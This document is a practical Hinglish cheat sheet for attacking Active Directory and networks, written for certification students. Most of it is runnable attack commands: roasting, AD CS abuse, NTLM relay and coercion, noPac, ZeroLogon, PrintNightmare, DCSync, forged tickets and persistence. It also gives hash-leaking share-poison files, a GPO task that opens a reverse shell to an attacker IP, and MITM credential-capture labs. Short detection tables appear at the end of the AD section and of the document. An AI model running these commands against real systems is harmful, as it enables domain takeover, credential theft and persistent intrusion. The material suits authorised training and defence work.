🏛️ THE DEFINITIVE ACTIVE DIRECTORY & NETWORK ATTACK BIBLE (PRACTICAL MASTERCLASS)**

> **Syllabus & Standard:** CEH v13 AI Module 8 | TCM Security PNPT | OSCP / CPENT / CRTP Standard  
> **Source Integration:** 102-Page Enterprise AD Cheat Sheet + Layer 2/3 Sniffing + MITM Attack Suites  
> **Format:** 100% Practical Commands, Exact Syntax, Exploitation Chains, Real Payload Structures & Defense Controls

---

## **📑 COMPREHENSIVE INDEX**

1. [Kerberos Fundamentals & Clock Synchronization](#1-kerberos-fundamentals--clock-synchronization)
2. [Active Directory Reconnaissance & Enumeration Arsenal](#2-active-directory-reconnaissance--enumeration-arsenal)
3. [Share Hunting & Poisoning Files (SCF, URL, Library-ms, Snaffler)](#3-share-hunting--poisoning-files)
4. [Passwords in SYSVOL & Group Policy Objects (GPO Abuse)](#4-passwords-in-sysvol--group-policy-objects-gpo-abuse)
5. [Kerberos Ticket Mechanics & The Ticket Zoo (Golden, Silver, Diamond, Sapphire)](#5-kerberos-ticket-mechanics--the-ticket-zoo)
6. [Roasting Attacks (Kerberoasting, AS-REP Roasting, Timeroasting, Targeted Roasting)](#6-roasting-attacks)
7. [Active Directory Certificate Services (AD CS: ESC1 to ESC11, Certifried, Shadow Credentials)](#7-active-directory-certificate-services-ad-cs)
8. [Advanced Coercion & NTLM Relaying (WebDAV Trick, Drop the MIC, RemotePotato0, mitm6)](#8-advanced-coercion--ntlm-relaying)
9. [AD Group & Privilege Abuse (DNSAdmins, Backup Operators, AdminSDHolder)](#9-ad-group--privilege-abuse)
10. [LAPS & gMSA Attacks (Golden gMSA, LAPS Extraction)](#10-laps--gmsa-attacks)
11. [From CVE to DC SYSTEM (noPac samAccountName Spoofing, ZeroLogon, PrintNightmare)](#11-from-cve-to-dc-system)
12. [DCOM Lateral Movement & SCCM / WSUS Exploitation](#12-dcom-lateral-movement--sccm--wsus-exploitation)
13. [Domain & Forest Trust Attacks (SID History, Inter-Realm Trust Tickets, PAM Trust)](#13-domain--forest-trust-attacks)
14. [Linux Active Directory Integration (CCACHE, SSSD KCM, Keytabs)](#14-linux-active-directory-integration)
15. [Total Domain Database Extraction (DCSync, NTDS.dit Shadow Copy, DSRM Persistence)](#15-total-domain-database-extraction)
16. [Enterprise Blue Team Defenses & Detection Rules Matrix](#16-enterprise-blue-team-defenses--detection-rules-matrix)

---

# **1. Kerberos Fundamentals & Clock Synchronization**

Kerberos authentication time-sensitive hoti hai. KDC aur client ke beech **maximum allowed clock skew 5 minutes** hota hai. Agar aapka Kali Linux box target domain se 5 minute se zyada aage ya peeche hai, to Kerberos authentication fail ho jayegi (`KRB_AP_ERR_SKEW`).

bash

# 1. Detect target Domain Controller clock skew automatically

nmap -sT 10.10.10.10 -p 445 --script smb2-time -vv

# 2. Fix #1: Manually synchronize Kali Linux system clock with target DC

sudo date -s "$(nmap -p 445 --script smb2-time 10.10.10.10 | grep 'date:' | cut -d: -f2-)"

# 3. Fix #2: Windows machine par direct sync

net time \\10.10.10.10 /set /y

# 4. Fix #3: Faketime utility (Bina system clock badle ek command ke liye time spoof karna)

faketime -f '+8h' python3 GetUserSPNs.py corp.local/user:pass -dc-ip 10.10.10.10

---

# **2. Active Directory Reconnaissance & Enumeration Arsenal**

### **2.1 PowerView 3.0 & ActiveDirectory Module (Windows Native)**

powershell

# Execution Policy bypass karke import karein

powershell -ep bypass

. .\PowerView.ps1

# Domain & Policy Enumeration

Get-NetDomain

Get-DomainSID

(Get-DomainPolicy)."system access"       # Password policy, lockout threshold

(Get-DomainPolicy)."kerberos policy"     # Max ticket lifetimes

# Domain Controller & Machine Discovery

Get-NetDomainController

Get-NetComputer -Ping                   # Live active machines

Find-LocalAdminAccess -Verbose          # Machine jahan current user LOCAL ADMIN hai!

# User & Session Hunting

Get-NetUser | Select-Object samaccountname, description, pwdlastset

Find-UserField -SearchField Description -SearchTerm "pass"  # Description me likhe passwords!

Get-NetLoggedon -ComputerName DC01      # DC par logged-in users

Invoke-UserHunter -CheckAccess          # Domain Admin session hunt karke token capture ke liye target batata hai

### **2.2 BloodHound / SharpHound (Visual Attack Paths)**

bash

# Remote Data Collection from Kali (No agents needed)

bloodhound-python -u 'john' -p 'Pass123!' -d corp.local -ns 10.10.10.10 -c All --zip

# Windows Target par execute karna

SharpHound.exe -c All --domain corp.local --zipfilename loot.zip

# Kali par Neo4j aur BloodHound launch karein

sudo neo4j console

bloodhound --no-sandbox

> **Top BloodHound Queries:**
> 
> - _Find Shortest Paths to Domain Admins_
> - _Find Principals with DCSync Rights_
> - _List all Kerberoastable Accounts_
> - _Shortest Path from Owned Principals_

### **2.3 PingCastle & ADRecon (Health & Audit)**

cmd

:: PingCastle: Automated AD Security Risk Assessment

pingcastle.exe --healthcheck --server 10.10.10.10 --user john --password Pass123!

:: ADRecon: Complete Report Generator

powershell.exe -ExecutionPolicy Bypass .\ADRecon.ps1 -DomainController 10.10.10.10

---

# **3. Share Hunting & Poisoning Files**

### **3.1 Share Hunting via Snaffler & SMBMap**

bash

# SMBMap: Fast Null Session & Share Permissions Check

smbmap -H 10.10.10.10 -u "" -p ""           # Null session check

smbmap -H 10.10.10.10 -u "user" -p "Pass" -R # Recursive listing

# Snaffler: Network shares par sensitive files (passwords, keys, configs) dhoondhna

snaffler.exe -d corp.local -c 10.10.10.10 -s -o snaffler.log

### **3.2 Writable Share Poisoning: SCF, URL, Library-ms & SearchConnector**

Agar koi share writable ho, to attacker special shortcut/library files daal deta hai jo Explorer me open hote hi bina click kiye NTLM hash bhejti hain:

ini

# Payload 1: @update.scf (IconFile auto-fetches UNC path)

[Shell]

Command=2

IconFile=\\10.10.10.50\Share\test.ico

[Taskbar]

Command=ToggleDesktop

ini

# Payload 2: @portal.url

[InternetShortcut]

URL=http://dummy.url

WorkingDirectory=whatever

IconFile=\\10.10.10.50\%USERNAME%.icon

IconIndex=1

xml

<!-- Payload 3: Windows Library File (.library-ms) -->

<?xml version="1.0" encoding="UTF-8"?>

<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

  <name>@windows.storage.dll,-34582</name>

  <version>6</version>

  <isLibraryPinned>true</isLibraryPinned>

  <iconReference>\\10.10.10.50@8888\folder.ico</iconReference>

  <templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>

</libraryDescription>

bash

# Automated Creation via Crop.exe / Farmer.exe:

farmer.exe 8888 0 c:\windows\temp\test.tmp

Crop.exe \\fileserver\common mdsec.url \\workstation@8888\mdsec.ico

# NetExec / CrackMapExec se Writable Share par auto-drop karna:

netexec smb 10.10.10.0/24 -u user -p pass -M slinky -o NAME=exploit SERVER=10.10.10.50

---

# **4. Passwords in SYSVOL & Group Policy Objects (GPO Abuse)**

### **4.1 GPP cPassword Decryption (MS14-025)**

Microsoft ki hardcoded AES key (`4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b`) se SYSVOL me purane XML passwords decrypt karna:

bash

# 1. Search SYSVOL XML files for cpassword

findstr /S /I cpassword \\corp.local\sysvol\corp.local\policies\*.xml

# 2. Automated decryption via Impacket

Get-GPPPassword.py corp.local/user:pass@10.10.10.10

# 3. Manual Decrypt via OpenSSL

echo '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

### **4.2 Exploiting Writable Group Policy Objects (GPO Abuse)**

Agar aapke user ke paas kisi GPO par `Write`, `GenericAll` ya `WriteDACL` rights hain:

powershell

# PowerView se vulnerable GPO find karna

Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# SharpGPOAbuse: Add Local Admin via GPO

SharpGPOAbuse.exe --AddLocalAdmin --UserAccount john --GPOName "Vulnerable_GPO"

# SharpGPOAbuse: Push Immediate Scheduled Task (Runs as SYSTEM on all domain machines)

SharpGPOAbuse.exe --AddComputerTask --TaskName "TelemetryUpdate" --Author 'DOMAIN\Admin' --Command "cmd.exe" --Arguments "/c powershell -enc <REV_SHELL_B64>" --GPOName "Vulnerable_GPO"

# Linux se pyGPOAbuse:

./pygpoabuse.py corp.local/user:pass -gpo-id "12345677-ABCD-9876-ABCD-123456789012" -powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.50',4444);..." -taskname "WindowsDiagnostic"

---

# **5. Kerberos Ticket Mechanics & The Ticket Zoo**

       KERBEROS TICKET COMPARISON TABLE

 ┌─────────────────┬─────────────────┬───────────────────────────────────────────────────────┐

 │ Ticket Type     │ Key Used To Sign│ Target Scope & Persistence                            │

 ├─────────────────┼─────────────────┼───────────────────────────────────────────────────────┤

 │ Golden Ticket   │ krbtgt NTLM/AES │ Full Domain Forest (TGT). Valid 10 years. Survived    │

 │                 │                 │ normal password resets.                               │

 ├─────────────────┼─────────────────┼───────────────────────────────────────────────────────┤

 │ Silver Ticket   │ Service NTLM/AES│ Specific Service only (CIFS, LDAP, HOST, WMI). No KDC │

 │                 │ (e.g. DC01$)    │ communication (Stealthy).                             │

 ├─────────────────┼─────────────────┼───────────────────────────────────────────────────────┤

 │ Diamond Ticket  │ krbtgt key      │ Legit TGT requested via KDC, PAC decrypted, modified  │

 │                 │                 │ (elevated to DA), and resigned. Bypasses KDC TGT logs!│

 ├─────────────────┼─────────────────┼───────────────────────────────────────────────────────┤

 │ Sapphire Ticket │ krbtgt AES key  │ S4U2self+U2U exchange se legit target PAC copy karke  │

 │                 │                 │ inject karta hai. Closest mimic to real traffic.      │

 ├─────────────────┼─────────────────┼───────────────────────────────────────────────────────┤

 │ RODC Golden Tkt │ RODC krbtgt Key │ Sirf specific RODC cache me authorized users ke liye. │

 └─────────────────┴─────────────────┴───────────────────────────────────────────────────────┘

### **5.1 Practical Execution: Diamond & Sapphire Tickets**

bash

# Diamond Ticket via Rubeus (Legit TGT maangkar sirf PAC modify karta hai)

Rubeus.exe diamond /domain:corp.local /user:john /password:Pass123! /dc:dc01.corp.local /enctype:aes256 /krbkey:<KRBTGT_AES256> /ticketuser:Administrator /ticketuserid:500 /ptt

# Sapphire Ticket via Ticketer.py (S4U2self se real PAC borrow karta hai)

ticketer.py -request -impersonate 'Administrator' -domain 'corp.local' -user 'john' -password 'Pass123!' -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-123...

### **5.2 Converting & Replaying Tickets Across Linux and Windows**

bash

# Convert between Windows .kirbi and Linux .ccache formats

impacket-ticketConverter ticket.kirbi ticket.ccache

# Or using kekeo

kekeo "misc::convert ccache ticket.kirbi"

# Replay ticket on Linux:

export KRB5CCNAME=/home/kali/ticket.ccache

impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local

---

# **6. Roasting Attacks**

### **6.1 Kerberoasting (RC4 vs AES Encryption Types)**

bash

# 1. Enumerate and request tickets for SPN accounts

impacket-GetUserSPNs corp.local/john:Pass123! -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt

# 2. Targeted Kerberoasting (User ke paas GenericWrite hai to khud SPN set karke roast karna)

targetedKerberoast.py -d corp.local -u john -p Pass123! -dc-ip 10.10.10.10 --only-abuse

# 3. Crack RC4 (Mode 13100) vs AES-128 (Mode 19600) vs AES-256 (Mode 19700)

hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt

hashcat -m 19700 -a 0 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt

### **6.2 AS-REP Roasting & Downgrade Attacks**

bash

# Standard AS-REP Roasting

impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt

hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt

# CVE-2022-33679: AS-REP Encryption Downgrade Attack (Forces RC4-MD4 session key)

python3 CVE-2022-33679.py corp.local/john dc01.corp.local

### **6.3 Timeroasting (Unauthenticated NTP RID Attack)**

bash

# Attacker Windows NTP service ko request bhejta hai aur computer account ka hash leak karwata hai

sudo ./timeroast.py 10.10.10.10 | tee ntp-hashes.txt

hashcat -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt

---

# **7. Active Directory Certificate Services (AD CS)**

Certificate misconfigurations domain privilege escalation ke sabse deadly vectors hain.

       AD CS ATTACK TAXONOMY

 ┌─────────────┬─────────────────────────────────────────────────────────────────────┐

 │ ESC Vector  │ Core Vulnerability & Abuse Path                                     │

 ├─────────────┼─────────────────────────────────────────────────────────────────────┤

 │ ESC1        │ Template allows client auth + `ENROLLEE_SUPPLIES_SUBJECT` (SAN alt).│

 │             │ Attacker requests certificate for Domain Administrator!             │

 ├─────────────┼─────────────────────────────────────────────────────────────────────┤

 │ ESC4        │ Access control misconfiguration on template. Attacker has write     │

 │             │ access -> adds ESC1 flags -> enrolls -> restores config.            │

 ├─────────────┼─────────────────────────────────────────────────────────────────────┤

 │ ESC6        │ CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set globally.           │

 │             │ Any template can be used with arbitrary SAN!                        │

 ├─────────────┼─────────────────────────────────────────────────────────────────────┤

 │ ESC8        │ NTLM Relay to AD CS HTTP Web Enrollment (`/certsrv/certfnsh.asp`).  │

 │             │ Coerce DC (PetitPotam) -> Relay to HTTP -> get DC certificate.      │

 └─────────────┴─────────────────────────────────────────────────────────────────────┘

### **7.1 Practical ESC1 Exploitation (Certipy & Certify)**

bash

# 1. Enumerate Vulnerable Templates

certipy find -u john@corp.local -p Pass123! -dc-ip 10.10.10.10 -vulnerable

# 2. Request Certificate impersonating Administrator

certipy req -u john@corp.local -p Pass123! -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.10

# Output: administrator.pfx generated!

# 3. Authenticate with Certificate -> Get NTLM Hash & TGT

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Output: Got TGT + NTLM Hash of Domain Administrator!

### **7.2 Practical ESC8 Exploitation (PetitPotam + NTLM Relay)**

bash

# Terminal 1: Relay NTLM to AD CS Web Enrollment HTTP Endpoint

impacket-ntlmrelayx -t http://10.10.10.15/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Terminal 2: Coerce Domain Controller to authenticate to Kali

python3 petitpotam.py 10.10.10.50 10.10.10.10

# (Kali = 10.10.10.50, DC = 10.10.10.10)

# Terminal 3: Use relayed base64 certificate to get TGT via Rubeus

Rubeus.exe asktgt /user:DC01$ /certificate:<BASE64_CERT> /ptt

# Instant DCSync!

### **7.3 Shadow Credentials via pyWhisker**

Agar aapke paas target user/computer par `GenericWrite` ya `WriteProperty` right hai:

bash

# 1. Target ke `msDS-KeyCredentialLink` attribute me malicious key insert karein

pywhisker.py -d corp.local -u john -p Pass123! --target "DC01$" --action add

# 2. Authenticate via PKINIT -> Get NT Hash

gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass password corp.local/DC01$ dc.ccache

export KRB5CCNAME=dc.ccache

getnthash.py -key <AS_REP_KEY> corp.local/DC01$

---

# **8. Advanced Coercion & NTLM Relaying**

### **8.1 WebDAV Authentication Coercion Trick**

Normal SMB relay attacks me SMB Signing active ho to relay fail ho jata hai. Lekin **WebDAV traffic HTTP ke through chalta hai** jisme signing enforce nahi hoti!

bash

# 1. Check if WebClient service is running on target

netexec smb 10.10.10.0/24 -u user -p pass -M webdav

# 2. Coerce authentication using NetBIOS/FQDN format with port

# (IP address dene par Windows Anonymous auth bhejta hai; Hostname@PORT dene par SYSTEM auth bhejta hai!)

python3 petitpotam.py "KALI_HOSTNAME@80/test.txt" 10.10.10.20

# 3. Relay to LDAPS for Resource-Based Constrained Delegation (RBCD)

impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access -smb2support

### **8.2 Drop the MIC (CVE-2019-1040)**

Ye exploit NTLM packets me se Message Integrity Code (MIC) remove kar deta hai, jisse SMB authentication ko bina validation fail kiye direct LDAP/LDAPS par relay kiya ja sakta hai:

bash

ntlmrelayx.py -t ldap://dc01.corp.local --remove-mic --escalate-user john -smb2support

python3 printerbug.py corp.local/user:pass@victim-exchange 10.10.10.50

---

# **9. AD Group & Privilege Abuse**

powershell

# ═══ 1. DNSAdmins Exploitation (SYSTEM via dll injection) ═══

# Member of DNSAdmins can load custom DLL on DNS Server startup:

dnscmd dc01.corp.local /config /serverlevelplugindll \\10.10.10.50\share\evil.dll

sc \\dc01 stop dns && sc \\dc01 start dns

# Result: evil.dll executes as NT AUTHORITY\SYSTEM on DC!

# ═══ 2. Backup Operators Abuse (SeBackupPrivilege) ═══

# Members can copy ANY file ignoring ACLs (including SAM, SYSTEM, and NTDS.dit):

Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege

Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite

reg save HKLM\SYSTEM C:\temp\SYSTEM

# ═══ 3. AdminSDHolder & SDProp Persistence ═══

# Modify ACL of AdminSDHolder; SDProp will push it to all protected groups every 60 mins:

Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName john -Rights All -Verbose

---

# **10. LAPS & gMSA Attacks**

### **10.1 LAPS (Local Administrator Password Solution) Extraction**

powershell

# Windows: Read cleartext LAPS password of all computers

Get-DomainComputer -Properties ms-mcs-admpwd,name | Select-Object name,ms-mcs-admpwd

# Linux pyLAPS:

./pyLAPS.py -u 'john' -d 'corp.local' -p 'Pass123!' --action get --dc-ip 10.10.10.10

### **10.2 gMSA (Group Managed Service Accounts) & Golden gMSA**

gMSA accounts ke 256-byte randomly generated passwords Active Directory KDS Root Key se calculate hote hain:

powershell

# 1. Read gMSA Password blob

$gmsa = Get-ADServiceAccount -Identity 'svc_sql$' -Properties 'msDS-ManagedPassword'

$mp = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'

$hash = ConvertTo-NTHash -Password $mp.SecureCurrentPassword

# 2. Golden gMSA Attack (Dump KDS Root Key -> compute passwords offline indefinitely)

GoldenGMSA.exe kdsinfo

GoldenGMSA.exe compute --sid <GMSA_SID> --kdskey <BASE64_KEY>

---

# **11. From CVE to DC SYSTEM**

### **11.1 noPac / samAccountName Spoofing (CVE-2021-42278 & CVE-2021-42287)**

Machine account ka naam DC ke naam se match karwake (`DC01$` →\to→ `DC01`) KDC ko confuse karna:

bash

# Automated Full Pwn via noPac Python

python3 sam_the_admin.py "corp.local/john:Pass123!" -dc-ip 10.10.10.10 -shell

# Output: Spawns interactive SYSTEM shell on Domain Controller!

# Or using noPac.exe on Windows

noPac.exe -domain corp.local -user john -pass Pass123! /dc dc01.corp.local /mAccount evilpc /mPassword Pass! /service ldaps /ptt /impersonate Administrator

### **11.2 ZeroLogon (CVE-2020-1472) — Clean Exploitation & Restoration**

bash

# 1. Exploit: Reset DC machine account password to empty

python3 cve-2020-1472-exploit.py DC01 10.10.10.10

# 2. Dump domain hashes using empty password

secretsdump.py -no-pass -just-dc 'corp.local/DC01$@10.10.10.10'

# 3. CRITICAL: Restore original DC password to prevent AD crashing!

python3 restorepassword.py corp.local/DC01@dc01.corp.local -target-ip 10.10.10.10 -hexpass <ORIGINAL_HEX_KEY_FROM_SECRETSDUMP>

### **11.3 PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**

bash

# Remote Code Execution via RPC Spooler DLL injection

python3 CVE-2021-1675.py corp.local/john:Pass123!@10.10.10.10 '\\10.10.10.50\share\reverse.dll'

---

# **12. DCOM Lateral Movement & SCCM / WSUS Exploitation**

### **12.1 DCOM Lateral Movement (Bypassing WinRM & SMB)**

bash

# MMC20.Application DCOM Execution via Impacket

dcomexec.py -object MMC20 corp.local/Administrator:Pass123!@10.10.10.20 "cmd.exe /c calc.exe"

# ShellWindows DCOM via PowerShell

$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10.10.10.20")

$obj = [System.Activator]::CreateInstance($com)

$obj.Item().Document.Application.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","C:\windows\system32",$null,0)

### **12.2 SharpSCCM: Extracting Network Access Accounts (NAA)**

cmd

:: SCCM client par local admin milne par domain plaintext credentials extract karna

SharpSCCM.exe get naa -u john -p Pass123!

SharpDPAPI.exe SCCM

### **12.3 SharpWSUS: Malicious Update Deployment**

cmd

:: Rogue update package create karke domain machines par admin payload push karna

SharpWSUS.exe create /payload:"C:\temp\payload.exe" /args:"-s" /title:"SecurityUpdate-2026"

SharpWSUS.exe approve /updateid:<ID> /computername:target.corp.local /groupname:"All Computers"

---

# **13. Domain & Forest Trust Attacks**

   [ CHILD DOMAIN ]                                   [ FOREST ROOT DOMAIN ]

  (dev.corp.local)                                       (corp.local)

         │                                                     │

         └─── Attacker crafts Golden Ticket ──────────────────►│

              injecting Enterprise Admins SID                  │

              (SID History: S-1-5-21-...-519)                  │

              Result: Full Forest Compromise!                  ▼

powershell

# 1. Enumerate Trusts

nltest /trusted_domains

Get-NetForestTrust

# 2. Child to Forest Compromise (SID History Injection)

# Child domain ka krbtgt hash lene ke baad Enterprise Admins (RID 519) ka SID add karein:

mimikatz # kerberos::golden /user:Administrator /domain:dev.corp.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-FOREST-SID-519 /krbtgt:<CHILD_KRBTGT_HASH> /ptt

# 3. Inter-Realm Trust Ticket (Forest to Forest with Trust Key)

mimikatz # kerberos::golden /domain:domainA.local /sid:S-1-5-21-DOM_A /rc4:<TRUST_KEY_HASH> /user:Administrator /service:krbtgt /target:domainB.local /ticket:trust.kirbi

---

# **14. Linux Active Directory Integration**

Linux servers jab SSSD ya Winbind ke through Active Directory se join hote hain:

bash

# 1. CCACHE Ticket Reuse from /tmp

ls -la /tmp/krb5cc_*

export KRB5CCNAME=/tmp/krb5cc_1000

klist

impacket-psexec -k -no-pass corp.local/user@dc01.corp.local

# 2. Extract NTLM Hashes from Keytab (/etc/krb5.keytab)

python3 keytabextract.py /etc/krb5.keytab

# Output: Key type 23 -> NTLM HASH of Machine Account!

netexec smb 10.10.10.10 -u 'LINUX-HOST$' -H <EXTRACTED_NTLM_HASH>

# 3. Extract SSSD Cached Credentials

python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey

---

# **15. Total Domain Database Extraction**

### **15.1 DCSync: Remote Hash Harvesting**

bash

# Mimikatz on Windows

mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Impacket from Kali

impacket-secretsdump -just-dc corp.local/Administrator:Pass123!@10.10.10.10 -outputfile ntds_hashes

### **15.2 DSRM (Directory Services Restore Mode) Persistence**

DSRM administrator account ka hash dump karke use local admin login ke liye enable karna:

powershell

# Registry enable remote DSRM logon (Value 2 = logon allowed anytime)

New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD -Force

# Ab DC par pass-the-hash karke local Administrator ke taur par kabhi bhi access kiya ja sakta hai!

---

# **16. Enterprise Blue Team Defenses & Detection Rules Matrix**

|Attack Category|Key Indicator of Compromise (IoC)|Enterprise Hardening & Prevention Control|
|---|---|---|
|**DCSync Attack**|Event ID 4662 (Replication access on Domain-DNS object by non-DC account)|Restrict `DS-Replication-Get-Changes-All` access control rights.|
|**Kerberoasting**|Event ID 4769 (TGS ticket requested with RC4 cipher `0x17`)|Enforce AES-256 for Kerberos; service account passwords 25+ characters.|
|**AS-REP Roasting**|Event ID 4771 (Kerberos pre-authentication failed with code `0x18`)|Do NOT allow "Do not require Kerberos preauthentication" on accounts.|
|**ZeroLogon**|Event ID 5805 (Netlogon failure) + sudden password reset of DC$|Apply KB4557222; enforce Netlogon secure channel sealing.|
|**GPO Abuse**|Event ID 5136 / 5137 (Directory service object modified in Policies container)|Restrict Write permissions on all Group Policy Objects.|
|**mitm6 / Rogue IPv6**|Event ID 4104 (PowerShell WPAD downloads) + rogue DHCPv6 replies|Enable DHCPv6 Guard & RA Guard on switches; disable unused IPv6.|
|**AD CS ESC1-ESC8**|Unusually short-lived certificates requested with SAN extension|Audit templates via Certipy; disable `ENROLLEE_SUPPLIES_SUBJECT`; require EPA on Web Enrollment.|



# **🛠️ ==🟠THE MISSING ADVANCED MITM PRACTICAL LABS**==

### **1. RDP Man-in-the-Middle Attack (`pyrdp-mitm`)**

Jab network par admin ya user RDP (Port 3389) se kisi server ko connect karta hai, to attacker beech me baith kar connection intercept karta hai.

 [ Client (Victim) ] ──► [ Attacker (pyrdp-mitm) ] ──► [ Target RDP Server ]

                              │

                              ├── NLA Disabled: PLAINTEXT PASSWORD CAPTURED!

                              ├── NLA Enabled: NetNTLMv2 Hash captured

                              └── Live Keystroke Logging & Screen Recording!

#### **Step-by-Step Practical:**

bash

# 1. ARP Spoofing start karo victim aur RDP server ke beech

sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.10

# 2. Port forwarding rule set karo taaki RDP traffic pyrdp listener par redirect ho

sudo iptables -t nat -A PREROUTING -p tcp --dport 3389 -j REDIRECT --to-port 3389

# 3. Launch pyrdp-mitm

pyrdp-mitm.py 192.168.1.10:3389 -k private_key.pem -c certificate.pem -o /tmp/rdp_loot/

# 4. Result:

# - Agar NLA (Network Level Authentication) disable hai:

#   [+] Credentials captured: Username: Administrator | Password: Password123!

# - Saare keystrokes /tmp/rdp_loot/ me text file me save hote hain.

# - RDP GUI session video file (.mp4) ke format me record ho jata hai!

---

### **2. WPAD Rogue Proxy + Forced Basic Auth (Plaintext Capture)**

Windows browsers by default **WPAD (Web Proxy Auto-Discovery)** dhoondhte hain. Agar attacker fake WPAD serve kare aur authentication type ko **Basic** force kar de, to browser user ke samne login prompt throw karta hai, aur entered password **Plaintext** me attacker ke paas aata hai!

bash

# Responder ko -w (WPAD) aur -F (Force Basic Auth) ke saath run karein:

sudo responder -I eth0 -wFv

# Kya hota hai:

# 1. Victim browser open karta hai (e.g. Chrome / Edge).

# 2. Browser WPAD query bhejta hai -> Responder bolta hai: "Proxy main hoon, authenticate karo".

# 3. -F flag ki wajah se browser Basic Authentication prompt dikhata hai.

# 4. User jaise hi credentials enter karta hai:

#    [HTTP] Cleartext credentials captured:

#    Username: CORP\jdoe | Password: MyRealPassword2026!

---

### **3. HSTS Bypass via SSLstrip+ aur DNS2Proxy**

Modern websites par **HSTS (HTTP Strict Transport Security)** laga hota hai, jisse normal `sslstrip` kaam nahi karta kyunki browser direct `https://` force karta hai.

**HSTS Bypass Mechanism:** Attacker browser ko direct HTTPS se downgrade nahi karta, balki links me se domain name ko subtly change kar deta hai:

- `https://facebook.com` ⟶\longrightarrow⟶ `http://faceboook.com` (ya `http://www.facebook.com` without dot)
- Browser samajhta hai ye naya domain hai jisme HSTS saved nahi hai, aur unencrypted HTTP request bhej deta hai!

bash

# 1. Bettercap me HSTS proxy rule activate karna:

sudo bettercap -iface eth0

# 2. Console me:

set http.proxy.sslstrip true

set net.sniff.verbose true

http.proxy on

arp.spoof on

---

### **4. Interactive SOCKS Relay Proxy (`ntlmrelayx -socks`)**

Agar network par multiple machines par SMB Signing disabled hai, to ek-ek hash crack karne ke bajaye incoming NTLM connection ko **SOCKS Proxy Tunnel** me convert kar liya jata hai:

bash

# 1. Start ntlmrelayx in SOCKS mode:

sudo impacket-ntlmrelayx -tf targets.txt -socks -smb2support

# 2. Victim se authentication aane ke baad console me check karein:

ntlmrelayx> socks

# Protocol   Target          Username                  Port

# --------   --------------  ------------------------  ----

# SMB        192.168.1.100   CORP\ADMINISTRATOR        445

# MSSQL      192.168.1.120   CORP\SQLADMIN             1433

# 3. Ab Proxychains use karke relayed session ke andar live execute karein:

# (Bina password ke victim machine par administrative share browse karein!)

proxychains impacket-smbclient //192.168.1.100/C$ -U "CORP/ADMINISTRATOR"

# MSSQL database me query run karein:

proxychains impacket-mssqlclient CORP/SQLADMIN@192.168.1.120 -windows-auth

---

### **5. Wireshark MITM Detection Filters (Blue Team Reality)**

Network audit ya defence me MITM attack ko pakadne ke liye ye exact filters use hote hain:

|Detection Goal|Wireshark Display Filter|What It Proves|
|---|---|---|
|**ARP Poisoning Detect karna**|`arp.duplicate-address-frame`|Ek hi IP ke liye do alag-alag MAC address broadcast ho rahe hain (Attacker + Gateway).|
|**Gratuitous ARP Storm**|`arp.opcode == 2 && eth.dst == ff:ff:ff:ff:ff:ff`|Fake unsolicited ARP replies flood ho rahe hain.|
|**Cleartext HTTP Credentials**|`http.request.method == "POST" && (http contains "password" \| http contains "passwd")`|Network par bina encryption ke credentials flow ho rahe hain.|
|**DNS Spoofing Mismatch**|`dns.flags.response == 1 && dns.count.answers > 1`|Legitimate IP ke sath rogue IP answer return ho raha hai.|